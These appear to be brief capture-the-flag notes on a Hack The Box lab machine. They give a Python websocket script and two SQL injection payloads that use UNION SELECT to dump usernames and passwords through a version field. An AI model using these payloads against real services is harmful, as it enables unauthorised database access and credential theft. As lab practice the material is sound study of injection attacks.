there was a app for linux o the site we used ==pyixs...py== to get the source code and

it gave us the hint for sqli

we tried the script like ==soccer== htb not it took too toot too much time

so

```
#!/usr/bin/python3
import sys
import websocket
import json

VERSION='0.0.2'
ws = websocket.WebSocket()
ws.connect("ws://ws.qreader.htb:5789/version")
ws.send(json.dumps({'version': sys.argv[1]}))
print(ws.recv())
```

run it

python3 ws_socket.py '0.0.2" union select 1,2,3,4-- -'

python3 ws_socket.py '0.0.2" union select username,password,3,4 from users-- -'

root was simple
